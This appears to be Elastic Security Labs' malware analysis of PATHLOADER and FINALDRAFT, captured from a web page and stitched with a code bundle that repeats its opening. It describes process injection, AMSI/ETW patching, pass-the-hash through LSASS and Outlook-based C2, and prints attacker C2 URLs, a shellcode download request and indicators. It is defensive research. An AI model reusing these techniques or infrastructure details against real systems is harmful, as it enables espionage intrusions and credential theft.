information\n\nUpon execution of the `GatherComputerInformation` command, information about the victim machine is collected and sent by FINALDRAFT. This information includes the computer name, the account username, internal and external IP addresses, and details about running processes.\n\nThis structure is described as follows:\n\n```c\nstruct ComputerInformation\n{\n  char field_0;\n  uint64_t session_id;\n  char field_9[9];\n  char username[50];\n  char computer_name[50];\n  char field_76[16];\n  char external_ip_address[20];\n  char internal_ip_address[20];\n  uint32_t sleep_value;\n  char field_B2;\n  uint32_t os_major_version;\n  uint32_t os_minor_version;\n  bool product_type;\n  uint32_t os_build_number;\n  uint16_t os_service_pack_major;\n  char field_C2[85];\n  char field_117;\n  char current_module_name[50];\n  uint32_t current_process_id;\n};\n```\n\n*Collected information structure*\n\nThe external IP address is collected when enabled in the configuration.\n\n![Retrieve external IP if flag is set](/assets/images/finaldraft/image37.png)\n\nThis address is obtained by FINALDRAFT using the following list of public services.\n\n| Public service                 |\n| :----------------------------- |\n| `hxxps://ip-api.io/json`       |\n| `hxxps://ipinfo.io/json`       |\n| `hxxps://myexternalip.com/raw` |\n| `hxxps://ipapi.co/json/`       |\n| `hxxps://jsonip.com/`          |\n\n*IP lookup service list*\n\n### Process injection\n\nFINALDRAFT has multiple process injection-related commands that can inject into either running processes or create a hidden process to inject into.\n\nIn cases where a process is created, the target process is either an executable path provided as a parameter to the command or defaults to `mspaint.exe` or `conhost.exe` as a fallback.\n\n![mspaint.exe process injection target](/assets/images/finaldraft/image50.png)\n\n![conhost.exe process injection target](/assets/images/finaldraft/image33.png)\n\nDepending on the command and its parameters, the process can be optionally created with its standard output handle piped. In this case, once the process is injected, FINALDRAFT reads from the pipe's output and sends its content along with the command response.\n\n![Create hidden process with piped STD handles](/assets/images/finaldraft/image44.png)\n\n![Read process' piped stdout](/assets/images/finaldraft/image24.png)\n\nAnother option exists where, instead of piping the standard handle of the process, FINALDRAFT, after creating and injecting the process, waits for the payload to create a Windows named pipe. It then connects to the pipe, writes some information to it, reads its output, and sends the data to the C2 through a separate channel. (In the case of the Outlook transport channel, this involves creating an additional draft email.).\n\n![Wait for injected process to create its named pipe](/assets/images/finaldraft/image58.png)\n\n![Read from named pipe and send to C2](/assets/images/finaldraft/image29.png)\n\nThe process injection procedure is basic and based on `VirtualAllocEx`, `WriteProcessMemory`, and `RtlCreateUserThread` API.\n\n![Process injection method](/assets/images/finaldraft/image48.png)\n\n### Forwarding data from TCP, UDP, and named pipes\n\nFINALDRAFT offers various methods of proxying data to C2, including UDP and TCP listeners, and a named pipe client.\n\nProxying UDP and TCP data involves handling incoming communication differently based on the protocol. For UDP, messages are received directly from the sender, while for TCP, client connections are accepted before receiving data. In both cases, the data is read from the socket and forwarded to the transport channel.\n\nBelow is an example screenshot of the `recvfrom` call from the UDP listener.\n\n![Received data from UDP client](/assets/images/finaldraft/image16.png)\n\nBefore starting the TCP listener server, FINALDRAFT adds a rule to the Windows Firewall. This rule is removed when the server shuts down. To add/remove these rules the malware uses **COM** and the [INetFwPolicy2](https://learn.microsoft.com/en-us/windows/win32/api/netfw/nn-netfw-inetfwpolicy2) and the [INetFwRule](https://learn.microsoft.com/en-us/windows/win32/api/netfw/nn-netfw-inetfwrule) interfaces.\n\n![FINALDRAFT adds firewall rule to allow TCP server](/assets/images/finaldraft/image34.png)\n\n![Instantiating the NetFwPolicy2 COM interface](/assets/images/finaldraft/image30.png)\n\nFINALDRAFT can also establish a TCP connection to a target. In this case, it sends a magic value, `“\\x12\\x34\\xab\\xcd\\ff\\xff\\xcd\\xab\\x34\\x12”` and expects the server to echo the same magic value back before beginning to forward the received data.\n\n![Send and receive magic data to/from TCP target](/assets/images/finaldraft/image27.png)\n\n![Magic data blob](/assets/images/finaldraft/image18.png)\n\nFor the named pipe, FINALDRAFT only connects to an existing pipe. The pipe name must be provided as a parameter to the command, after which it reads the data and forwards it through a separate channel.\n\n![Forward data from named pipe](/assets/images/finaldraft/image31.png)\n\n### File manipulation\n\nFor the file deletion functionality, FINALDRAFT prevents file recovery by overwriting file data with zeros before deleting them. \n\n![Zero out file before deletion](/assets/images/finaldraft/image54.png)\n\nFINALDRAFT defaults to `CopyFileW` for file copying. However, if it fails, it will attempt to copy the file at the NTFS cluster level.\n\nIt first opens the source file as a drive handle. To retrieve the cluster size of the volume where the file resides, it uses `GetDiskFreeSpaceW` to retrieve information about the number of sectors per cluster and bytes per sector. `DeviceIoControl` is then called with `FSCTL_GET_RETRIEVAL_POINTERS` to retrieve details of extents: locations on disk storing the data of the specified file and how much data is stored there in terms of cluster size. \n\n![Retrieving file data extents](/assets/images/finaldraft/image14.png)\n\nFor each extent, it uses `SetFilePointer` to move the source file pointer to the corresponding offset in the volume; reading and writing one cluster of data at a time from the source file to the destination file.\n\n![Read/write file between clusters](/assets/images/finaldraft/image57.png)\n\nIf the file does not have associated cluster mappings, it is a resident file, and data is stored in the MFT itself. It uses the file's MFT index to get its raw MFT record. The record is then parsed to locate the `$DATA` attribute (type identifier  \\= 128). Data is then extracted from this attribute and written to the destination file using `WriteFile`.\n\n![Copy resident files using MFT records](/assets/images/finaldraft/image17.png)\n\n### Injected Modules\n\nOur team observed several additional modules loaded through the `DoProcessInjectionSendOutputEx` command handler performing process injection and writing the output back through a named pipe. This shellcode injected by FINALDRAFT leverages the well-known [sRDI](https://github.com/monoxgas/sRDI/blob/master/ShellcodeRDI/ShellcodeRDI.c) project, enabling the loading of a fully-fledged PE DLL into memory within the same process, resolving its imports and calling its export entrypoint.\n\n#### Network enumeration (`ipconfig.x64.dll`)\n\nThis module creates a named pipe (`\\\\.\\Pipe\\E340C955-15B6-4ec9-9522-1F526E6FBBF1`) waiting for FINALDRAFT to connect to it.  Perhaps to prevent analysis/sandboxing, the threat actor used a password (`Aslire597`) as an argument, if the password is incorrect, the module will not run.  \n\n![String comparison with command-line password](/assets/images/finaldraft/image12.png)\n\nAs its name suggests, this module is a custom implementation of the ipconfig command retrieving networking information using Windows API’s (`GetAdaptersAddresses`, `GetAdaptersInfo`, `GetNetworkParams`) and reading the Windows registry keypath (`SYSTEM\\\\CurrentControlSet\\\\Services\\\\Tcpip\\\\Parameters\\\\Interfaces`). After the data is retrieved, it is sent back to FINALDRAFT through the named pipe.\n\n![Retrieving network adapter information](/assets/images/finaldraft/image38.png)\n\n#### PowerShell execution (`Psloader.x64.dll`)\n\nThis module allows the operator to execute PowerShell commands without invoking the `powershell.exe` binary. The code used is taken from [PowerPick](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerPick/SharpPick/Program.cs), a well-known open source offensive security tool.\n\nTo evade detection, the module first hooks the `EtwEventWrite`, `ReportEventW`, and `AmsiScanBuffer` APIs, forcing them to always return `0`, which disables ETW logging and bypasses anti-malware scans.\n\n![Patching AMSI and ETW APis](/assets/images/finaldraft/image20.png)\n\nNext, the DLL loads a .NET payload ([PowerPick](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerPick/SharpPick/Program.cs)) stored in its `.data` section using the [CLR Hosting technique](https://learn.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/clr-hosting-interfaces).\n\n![Managed code of PowerPick loaded using CLR hosting technique](/assets/images/finaldraft/image25.png)\n\nThe module creates a named pipe (`\\\\.\\Pipe\\BD5AE956-0CF5-44b5-8061-208F5D0DBBB2`) which is used for command forwarding and output retrieval. The main thread is designated as the receiver, while a secondary thread is created to write data to the pipe. Finally, the managed **PowerPick** binary is loaded and executed by the module.\n\n![Managed binary of PowerPick loaded by the module](/assets/images/finaldraft/image26.png)\n\n#### Pass-the-Hash toolkit (`pnt.x64.dll`)\n\nThis module is a custom Pass-the-Hash (PTH) toolkit used to start new processes with stolen NTLM hashes. This PTH implementation is largely inspired by the one used by [Mimikatz](https://github.com/gentilkiwi/mimikatz), enabling lateral movement.\n\n![Decrypted strings from memory for PTH module](/assets/images/finaldraft/image45.png)\n\nA password (`Aslire597`), domain, and username with the NTLM hash, along with the file path of the program to be elevated, are required by this module. In our sample, this command line is loaded by the sRDI shellcode. Below is an example of the command line.\n\n`program.exe \u003cpassword\u003e \u003cdomain\u003e\\\u003caccount\u003e:\u003cntlm_hash\u003e \u003ctarget_process\u003e`\n\nLike the other module, it creates a named pipe, ”`\\\\.\\Pipe\\EAA0BF8D-CA6C-45eb-9751-6269C70813C9`”, and awaits incoming connections from FINALDRAFT. This named pipe serves as a logging channel.\n\n![named pipe creation for pnt.x64.dll](/assets/images/finaldraft/image21.png)\n\nAfter establishing the pipe connection, the malware creates a target process in a suspended state using `CreateProcessWithLogonW`, identifies key structures like the `LogonSessionList` and `LogonSessionListCount` within the Local Security Authority Subsystem Service (LSASS) process, targeting the logon session specified by the provided argument. \n\nOnce the correct session is matched, the current credential structure inside LSASS is overwritten with the supplied NTLM hash instead of the current user's NTLM hash, and finally, the process thread is resumed. This technique is well explained in the blog post \"[Inside the Mimikatz Pass-the-Hash Command (Part 2\\)](https://www.praetorian.com/blog/inside-mimikatz-part2/)\" by Praetorian. The result is then sent to the named pipe.\n\n![Named pipe output and created process](/assets/images/finaldraft/image22.png)\n\n## FINALDRAFT ELF variant\n\nDuring this investigation, we discovered an ELF variant of FINALDRAFT. This version supports more transport protocols than the PE version, but has fewer features, suggesting it might be under development.\n\n### Additional transport channels\n\nThe ELF variant of FINALDRAFT supports seven additional protocols for C2 transport channels:\n\n| C2 communication protocols                                      |\n| :-------------------------------------------------------------- |\n| HTTP/HTTPS                                                      |\n| Reverse UDP                                                     |\n| ICMP                                                            |\n| Bind TCP                                                        |\n| Reverse TCP                                                     |\n| DNS                                                             |\n| Outlook via REST API (could be communicating with an API proxy) |\n| Outlook via Graph API                                           |\n\n*FINALDRAFT ELF variant C2 communication options*\n\nFrom the ELF samples discovered, we have identified implants configured to use the HTTP and Outlook via Graph API channels.\n\nWhile the code structure is similar to the most contemporary PE sample, at the time of this publication, some parts of the implant's functionality were modified to conform to the Linux environment. For example, new Microsoft OAuth refresh tokens requested are written to a file on disk, either `/var/log/installlog.log.\u003cUUID_from_config\u003e` or `/mnt/hgfsdisk.log.\u003cUUID_from_config\u003e` if it fails to write to the prior file.\n\nBelow is a snippet of the configuration which uses the HTTP channel. We can see two C2 servers are used in place of a Microsoft refresh token, the port number `0x1bb` (`443`) at offset `0xc8`, and flag for using HTTPS at offset `0xfc`.\n\n![FINALDRAFT ELF variant configuration snippet](/assets/images/finaldraft/image2.png)\n\nThe domains are intentionally designed to typosquat well-known vendors, such as \"VMSphere\" (VMware vSphere). However, it's unclear which vendor \"Hobiter\" is attempting to impersonate in this instance.\n\n| C2                  |\n| :------------------ |\n| support.vmphere.com |\n| update.hobiter.com  |\n\n*Domain list*\n\n### Commands\n\n![Command handlers](/assets/images/finaldraft/image32.png)\n\nAll of the commands overlap with its Windows counterpart, but offer fewer options. There are two C2 commands dedicated to collecting information about the victim's machine. Together, these commands gather the following details:\n\n* Hostname  \n* Current logged-in user  \n* Intranet IP address  \n* External IP address  \n* Gateway IP address  \n* System boot time  \n* Operating system name and version  \n* Kernel version  \n* System architecture  \n* Machine GUID  \n* List of active network connections  \n* List of running processes  \n* Name of current process\n\n#### Command Execution\n\nWhile there are no process injection capabilities, the implant can execute shell commands directly. It utilizes `popen` for command execution, capturing both standard output and errors, and sending the results back to the C2 infrastructure.\n\n![Executing shell command](/assets/images/finaldraft/image28.png)\n\n#### Self Deletion\n\nTo dynamically resolve the path of the currently running executable, its symlink pointing to the executable image is passed to `sys_readlink`. `sys_unlink` is then called to remove the executable file from the filesystem.\n\n![Self deletion using sys\\_unlink](/assets/images/finaldraft/image11.png)\n\n## Older FINALDRAFT PE sample\n\nDuring our investigation, we identified an older version of FINALDRAFT. This version supports half as many commands but includes an additional transport protocol alongside the MS Graph API/Outlook transport channel.\n\nThe name of the binary is `Session.x64.dll`, and its entrypoint export is called `GoogleProxy`:\n\n![PE export of FINALDRAFT](/assets/images/finaldraft/image5.png)\n\n### HTTP transport channel\n\nThis older version of FINALDRAFT selects between the Outlook or HTTP transport channel based on the configuration.\n\n![Choice between Outlook and HTTP transport channels](/assets/images/finaldraft/image59.png)\n\nIn this sample, the configuration contains a list of hosts instead of the refresh token found in the main sample. These same domains were used by PATHLOADER, the domain (`checkponit[.]com`) was registered on 2022-08-26T09:43:16Z and domain (`fortineat[.]com`) was registred on 2023-11-08T09:47:47Z.\n\n![Domains found in the configuration](/assets/images/finaldraft/image6.png)\n\nThe domains purposely typosquat real known vendors, **CheckPoint** and **Fortinet**, in this case.\n\n| C2                        |\n| :------------------------ |\n| `poster.checkponit[.]com` |\n| `support.fortineat[.]com` |\n\n*Domain list*\n\n### Shell command \n\nAn additional command exists in this sample that is not present in later versions. This command, with ID `1`, executes a shell command.\n\n![Shell command handler setup](/assets/images/finaldraft/image9.png)\n\nThe execution is carried out by creating a `cmd.exe` process with the `\"/c\"` parameter, followed by appending the actual command to the parameter.\n\n![Create piped cmd.exe process](/assets/images/finaldraft/image60.png)\n\n# Detection\n\nElastic Defend detects the process injection mechanism through two rules. The first rule detects the `WriteProcessMemory` API call targeting another process, which is a common behavior observed in process injection techniques.\n\n![Detecting WriteProcessMemory in FINALDRAFT process injection](/assets/images/finaldraft/image42.png)\n\nThe second rule detects the creation of a remote thread to execute the shellcode.\n\n![Detection of injected shellcode thread](/assets/images/finaldraft/image35.png)\n\nWe also detect the loading of the PowerShell engine by the `Psloader.x64.dll` module, which is injected into the known target `mspaint.exe`.\n\n![Detection of PowerShell engine loads](/assets/images/finaldraft/image4.png)\n\n# Malware and MITRE ATT\\\u0026CK\n\nElastic uses the [MITRE ATT\\\u0026CK](https://attack.mitre.org/) framework to document common tactics, techniques, and procedures that threats use against enterprise networks.\n\n## Tactics\n\n* [Command and Control](https://attack.mitre.org/tactics/TA0011/)  \n* [Defense Evasion](https://attack.mitre.org/tactics/TA0005/)  \n* [Discovery](https://attack.mitre.org/tactics/TA0007/)  \n* [Execution](https://attack.mitre.org/tactics/TA0002/)  \n* [Exfiltration](https://attack.mitre.org/tactics/TA0010/)  \n* [Lateral Movement](https://attack.mitre.org/tactics/TA0008/)\n\n## Techniques\n\nTechniques represent how an adversary achieves a tactical goal by performing an action.\n\n- [Web Service: One-Way Communication](https://attack.mitre.org/techniques/T1102/003/)  \n- [Encrypted Channel: Symmetric Cryptography](https://attack.mitre.org/techniques/T1573/001/)  \n- [Hide Artifacts: Hidden Window](https://attack.mitre.org/techniques/T1564/003/)  \n- [Masquerading: Match Legitimate Name or Location](https://attack.mitre.org/techniques/T1036/005/)  \n- [Masquerading: Rename System Utilities](https://attack.mitre.org/techniques/T1036/003/)  \n- [Process Injection: Portable Executable Injection](https://attack.mitre.org/techniques/T1055/002/)  \n- [Reflective Code Loading](https://attack.mitre.org/techniques/T1620/)  \n- [Use Alternate Authentication Material: Pass the Hash](https://attack.mitre.org/techniques/T1550/002/)  \n- [Network Service Discovery](https://attack.mitre.org/techniques/T1046/)  \n- [Process Discovery](https://attack.mitre.org/techniques/T1057/)  \n- [Query Registry](https://attack.mitre.org/techniques/T1012/)  \n- [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567/)\n\n# Mitigations\n\n## Detection\n\n- [Suspicious Memory Write to a Remote Process](https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/windows/defense_evasion_suspicious_memory_write_to_a_remote_process.toml)  \n- [Unusual PowerShell Engine ImageLoad](https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/windows/execution_unusual_powershell_engine_imageload.toml)  \n- [AMSI Bypass via Unbacked Memory](https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/windows/defense_evasion_amsi_bypass_via_unbacked_memory.toml)  \n- [AMSI or WLDP Bypass via Memory Patching](https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/windows/defense_evasion_amsi_or_wldp_bypass_via_memory_patching.toml)  \n- [Suspicious Execution via Windows Service](https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/windows/privilege_escalation_suspicious_execution_via_windows_services.toml)  \n- [Execution via Windows Command Line Debugging Utility](https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/windows/defense_evasion_execution_via_windows_command_line_debugging_utility.toml)  \n- [Suspicious Parent-Child Relationship](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/windows/defense_evasion_suspicious_parent_child_relationship.toml)\n\n## YARA\n\nElastic Security has created the following YARA rules related to this post:\n\n- [Windows.Trojan.PathLoader](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_PathLoader.yar)  \n- [Windows.Trojan.FinalDraft](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_FinalDraft.yar)  \n- [Linux.Trojan.FinalDraft](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Linux_Trojan_FinalDraft.yar)  \n- [Multi.Trojan.FinalDraft](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Multi_Trojan_FinalDraft.yar)\n\n# Observations\n\nThe following observables were discussed in this research:\n\n| Observable                                                         | Type   | Reference                    | Date                                                                     |\n| :----------------------------------------------------------------- | :----- | :--------------------------- | :----------------------------------------------------------------------- |\n| `9a11d6fcf76583f7f70ff55297fb550fed774b61f35ee2edd95cf6f959853bcf` | SHA256 | PATHLOADER                   | VT first seen: 2023-05-09 09:44:45 UTC                                   |\n| `39e85de1b1121dc38a33eca97c41dbd9210124162c6d669d28480c833e059530` | SHA256 | FINALDRAFT initial sample    | Telemetry first seen: 2024-11-28 20:49:18.646                            |\n| `83406905710e52f6af35b4b3c27549a12c28a628c492429d3a411fdb2d28cc8c` | SHA256 | FINALDRAFT ELF variant       | VT first seen: 2024-10-05 07:15:00 UTC                                   |\n| `poster.checkponit[.]com`                                          | domain | PATHLOADER/FINALDRAFT domain | Creation date: 2022-08-26T09:43:16Z  Valid until: 2025-08-26T07:00:00Z   |\n| `support.fortineat[.]com`                                          | domain | PATHLOADER/FINALDRAFT domain | Creation date: 2023-11-08T09:47:47Z Valid until: 2024-11-08T09:47:47.00Z |\n| `support.vmphere[.]com`                                            | domain | FINALDRAFT domain            | Creation date: 2023-09-12T12:35:57Z Valid until: 2025-09-12T12:35:57Z    |\n| `update.hobiter[.]com`                                             | domain | FINALDRAFT domain            | Creation date: 2023-09-12T12:35:58Z Valid until: 2025-09-12T12:35:58Z    |\n","code":"var Component=(()=\u003e{var h=Object.create;var a=Object.defineProperty;var m=Object.getOwnPropertyDescriptor;var p=Object.getOwnPropertyNames;var g=Object.getPrototypeOf,f=Object.prototype.hasOwnProperty;var u=(n,e)=\u003e()=\u003e(e||n((e={exports:{}}).exports,e),e.exports),w=(n,e)=\u003e{for(var t in e)a(n,t,{get:e[t],enumerable:!0})},o=(n,e,t,l)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let r of p(e))!f.call(n,r)\u0026\u0026r!==t\u0026\u0026a(n,r,{get:()=\u003ee[r],enumerable:!(l=m(e,r))||l.enumerable});return n};var b=(n,e,t)=\u003e(t=n!=null?h(g(n)):{},o(e||!n||!n.__esModule?a(t,\"default\",{value:n,enumerable:!0}):t,n)),T=n=\u003eo(a({},\"__esModule\",{value:!0}),n);var s=u((P,d)=\u003e{d.exports=_jsx_runtime});var _={};w(_,{default:()=\u003eA,frontmatter:()=\u003ey});var i=b(s()),y={title:\"You've Got Malware: FINALDRAFT Hides in Your Drafts\",slug:\"finaldraft\",date:\"2025-02-13\",description:\"During a recent investigation (REF7707), Elastic Security Labs discovered new malware targeting a foreign ministry. The malware includes a custom loader and backdoor with many features including using Microsoft\\u2019s Graph API for C2 communications.\",author:[{slug:\"cyril-francois\"},{slug:\"jia-yu-chan\"},{slug:\"salim-bitam\"},{slug:\"daniel-stepanic\"}],image:\"Security Labs Images 13.jpg\",category:[{slug:\"malware-analysis\"}],tags:[{slug:\"REF7707\"},{slug:\"FINALDRAFT\"},{slug:\"PATHLOADER\"}]};function c(n){let e=Object.assign({h1:\"h1\",p:\"p\",img:\"img\",a:\"a\",h2:\"h2\",h3:\"h3\",code:\"code\",pre:\"pre\",em:\"em\",h4:\"h4\",ul:\"ul\",li:\"li\",strong:\"strong\",div:\"div\",table:\"table\",thead:\"thead\",tr:\"tr\",th:\"th\",tbody:\"tbody\",td:\"td\"},n.components);return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(e.h1,{id:\"summary\",children:\"Summary\"}),`\n`,(0,i.jsx)(e.p,{children:\"While investigating REF7707, Elastic Security Labs discovered a new family of previously unknown malware that leverages Outlook as a communication channel via the Microsoft Graph API. This post-exploitation kit includes a loader, a backdoor, and multiple submodules that enable advanced post-exploitation activities.\"}),`\n`,(0,i.jsx)(e.p,{children:\"Our analysis uncovered a Linux variant and an older PE variant of the malware, each with multiple distinct versions that suggest these tools have been under development for some time.\"}),`\n`,(0,i.jsx)(e.p,{children:\"The completeness of the tools and the level of engineering involved suggest that the developers are well-organized. The extended time frame of the operation and evidence from our telemetry suggest it\\u2019s likely an espionage-oriented campaign.\"}),`\n`,(0,i.jsx)(e.p,{children:\"This report details the features and capabilities of these tools.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image47.png\",alt:\"PATHLOADER \u0026 FINALDRAFT execution diagram\",width:\"1547\",height:\"865\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"For the campaign analysis of REF7707 - check out \",(0,i.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/fragile-web-ref7707\",rel:\"nofollow\",children:\"From South America to Southeast Asia: The Fragile Web of REF7707\"}),\".\"]}),`\n`,(0,i.jsx)(e.h1,{id:\"technical-analysis\",children:\"Technical Analysis\"}),`\n`,(0,i.jsx)(e.h2,{id:\"pathloader\",children:\"PATHLOADER\"}),`\n`,(0,i.jsx)(e.p,{children:\"PATHLOADER is a Windows PE file that downloads and executes encrypted shellcode retrieved from external infrastructure.\"}),`\n`,(0,i.jsx)(e.p,{children:\"Our team recovered and decrypted the shellcode retrieved by PATHLOADER, extracting a new implant we have not seen publicly reported, which we call FINALDRAFT. We believe these two components are used together to infiltrate sensitive environments.\"}),`\n`,(0,i.jsx)(e.h3,{id:\"configuration\",children:\"Configuration\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"PATHLOADER is a lightweight Windows executable at 206 kilobytes; this program downloads and executes shellcode hosted on a remote server. PATHLOADER includes an embedded configuration stored in the \",(0,i.jsx)(e.code,{children:\".data\"}),\" section that includes C2 and other relevant settings.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image7.png\",alt:\"Embedded configuration\",width:\"1356\",height:\"147\"})}),`\n`,(0,i.jsx)(e.p,{children:\"After Base64 decoding and converting from the embedded hex string, the original configuration is recovered with two unique typosquatted domains resembling security vendors.\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`https://poster.checkponit.com:443/nzoMeFYgvjyXK3P;https://support.fortineat.com:443/nzoMeFYgvjyXK3P;*|*\n`})}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.em,{children:\"Configuration from PATHLOADER\"})}),`\n`,(0,i.jsx)(e.h3,{id:\"api-hashing\",children:\"API Hashing\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"In order to block static analysis efforts, PATHLOADER performs API hashing using the \",(0,i.jsx)(e.a,{href:\"https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function\",rel:\"nofollow\",children:\"Fowler\\u2013Noll\\u2013Vo hash\"}),\" function. This can be observed based on the immediate value \",(0,i.jsx)(e.code,{children:\"0x1000193\"}),\" found 37 times inside the binary. The API hashing functionality shows up as in-line as opposed to a separate individual function.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image10.png\",alt:\"Occurrences of value 0x1000193\",width:\"481\",height:\"693\"})}),`\n`,(0,i.jsx)(e.h3,{id:\"string-obfuscation\",children:\"String Obfuscation\"}),`\n`,(0,i.jsx)(e.p,{children:\"PATHLOADER uses string encryption to obfuscate functionality from analysts reviewing the program statically. While the strings are easy to decrypt while running or if using a debugger, the obfuscation shows up in line, increasing the complexity and making it more challenging to follow the control flow. This obfuscation uses SIMD (Single Instruction, Multiple Data) instructions and XMM registers to transform the data.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image56.png\",alt:\"String obfuscation example\",width:\"1146\",height:\"960\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"One string related to logging \",(0,i.jsx)(e.code,{children:\"WinHttpSendRequest\"}),\" error codes used by the malware developer was left unencrypted.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image55.png\",alt:\"Logging string left unencrypted\",width:\"458\",height:\"72\"})}),`\n`,(0,i.jsx)(e.h3,{id:\"executionbehavior\",children:\"Execution/Behavior\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Upon execution, PATHLOADER employs a combination of  \",(0,i.jsx)(e.code,{children:\"GetTickCount64\"}),\" and \",(0,i.jsx)(e.code,{children:\"Sleep\"}),\" methods to avoid immediate execution in a sandbox environment. After a few minutes, PATHLOADER parses its embedded configuration, cycling through both preconfigured C2 domains (\",(0,i.jsx)(e.code,{children:\"poster.checkponit[.]com\"}),\", \",(0,i.jsx)(e.code,{children:\"support.fortineat[.]com\"}),\") attempting to download the shellcode through \",(0,i.jsx)(e.code,{children:\"HTTPS\"}),\" \",(0,i.jsx)(e.code,{children:\"GET\"}),\" requests.\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`GET http://poster.checkponit.com/nzoMeFYgvjyXK3P HTTP/1.1\nCache-Control: no-cache\nConnection: Keep-Alive\nPragma: no-cache\nHost: poster.checkponit.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"The shellcode is AES encrypted and Base64 encoded. The AES decryption is performed using the shellcode download URL path \",(0,i.jsx)(e.code,{children:\"\\u201C/nzoMeFYgvjyXK3P\\u201D\"}),\" as the 128-bit key used in the call to the \",(0,i.jsx)(e.code,{children:\"CryptImportKey\"}),\" API.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image53.png\",alt:\"CryptImportKey parameters\",width:\"933\",height:\"204\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"After the \",(0,i.jsx)(e.code,{children:\"CryptDecrypt\"}),\" call, the decrypted shellcode is copied into previously allocated memory. The memory page is then set to \",(0,i.jsx)(e.code,{children:\"PAGE_EXECUTE_READ_WRITE\"}),\" using the \",(0,i.jsx)(e.code,{children:\"NtProtectVirtualMemory\"}),\" API. Once the page is set to the appropriate protection, the shellcode entrypoint is called, which in turn loads and executes the next stage: FINALDRAFT.\"]}),`\n`,(0,i.jsx)(e.h2,{id:\"finaldraft\",children:\"FINALDRAFT\"}),`\n`,(0,i.jsx)(e.p,{children:\"FINALDRAFT is a 64-bit malware written in C++ that focuses on data exfiltration and process injection. It includes additional modules, identified as parts of the FINALDRAFT kit, which can be injected by the malware. The output from these modules is then forwarded to the C2 server.\"}),`\n`,(0,i.jsx)(e.h3,{id:\"entrypoint\",children:\"Entrypoint\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"FINALDRAFT exports a single entry point as its entry function. The name of this function varies between samples; in this sample, it is called \",(0,i.jsx)(e.code,{children:\"UpdateTask\"}),\".\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image51.png\",alt:\"PE export of FINALDRAFT\",width:\"581\",height:\"122\"})}),`\n`,(0,i.jsx)(e.h3,{id:\"initialization\",children:\"Initialization\"}),`\n`,(0,i.jsx)(e.p,{children:\"The malware is initialized by loading its configuration and generating a session ID.\"}),`\n`,(0,i.jsx)(e.h4,{id:\"configuration-loading-process\",children:\"Configuration loading process\"}),`\n`,(0,i.jsx)(e.p,{children:\"The configuration is hardcoded in the binary in an encrypted blob. It is decrypted using the following algorithm.\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:\"language-c\",children:`for ( i = 0; i \u003c 0x149A; ++i )\n  configuration[i] ^= decryption_key[i \u0026 7];\n`})}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.em,{children:\"Decryption algorithm for configuration data\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"The decryption key is derived either from the Windows product ID (\",(0,i.jsx)(e.code,{children:\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\ProductId\"}),\") or from a string located after the encrypted blob. This is determined by a global flag located after the encrypted configuration blob.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image8.png\",alt:\"Decryption key and flag found after the encrypted config blob\",width:\"979\",height:\"179\"})}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/finaldraft/image41.png\",alt:\"Choice between the decryption key or Windows product ID for derivation\",width:\"624\",height:\"360\"})}),`\n`,(0,i.jsx)(e.p,{children:\"The decryption key derivation algorithm is performed as 